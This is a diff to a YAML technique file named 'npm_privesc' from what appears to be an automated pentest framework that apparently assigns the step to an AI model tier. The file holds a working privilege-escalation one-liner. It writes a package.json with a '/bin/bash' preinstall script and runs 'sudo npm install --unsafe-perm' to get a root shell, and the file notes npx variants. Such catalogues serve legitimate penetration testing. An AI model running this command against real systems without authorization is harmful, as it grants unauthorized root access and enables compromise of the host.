@@ -2,15 +2,21 @@ name: npm_privesc
 category: privesc
 description: npm/node privilege escalation
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "echo '{"scripts":{"preinstall":"/bin/bash"}}' > /tmp/pkg/package.json && sudo npm install /tmp/pkg --unsafe-perm"
-parser: null
+command_template: 'echo ''{"scripts":{"preinstall":"/bin/bash"}}'' > /tmp/pkg/package.json
+  && sudo npm install /tmp/pkg --unsafe-perm
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- npm_abused
+- root_shell
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If sudo allows npm: preinstall script in package.json runs as root. Also: npm exec, npx with malicious package."
+mechanism: 'If sudo allows npm: preinstall script in package.json runs as root. Also:
+  npm exec, npx with malicious package.'
+hacktricks_ref: network-services-pentesting/pentesting-web/electron-desktop-apps/README.md
